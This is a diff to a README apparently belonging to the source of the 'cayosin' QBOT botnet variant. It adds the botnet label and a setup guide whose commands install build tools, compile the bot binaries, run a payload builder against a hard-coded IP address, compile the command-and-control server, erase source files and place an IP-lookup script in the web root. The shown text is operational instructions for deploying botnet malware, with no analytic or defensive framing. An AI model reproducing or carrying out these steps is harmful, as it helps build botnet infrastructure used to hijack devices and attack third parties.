@@ -1,4 +1,6 @@
-tested and working on centos 6, 6.9 and 7.7
+cayosin QBOT botnet variant. tested and working on centos 6, 6.9 and 7.7.
+
+installation / setup guide:
 
 yum update -y; yum install wget python gcc nano screen httpd php -y; service httpd start; ulimit -n 999999
 
@@ -13,6 +15,8 @@ change ips in:
 - /CayosinCNC.c look for iplookup and change the ip there
 
 gcc bot/*.c -o bp -pthread; python Cayosin.py fff 179.43.154.140  cayosin; rm -rf bot; mv iplookup.php /var/www/html
+
+make sure to save the payload
 
 gcc -o cnc CayosinCNC.c -pthread; rm -rf CayosinCNC.c; rm -rf Cayosin.py; rm -rf cross-compiler-*
 
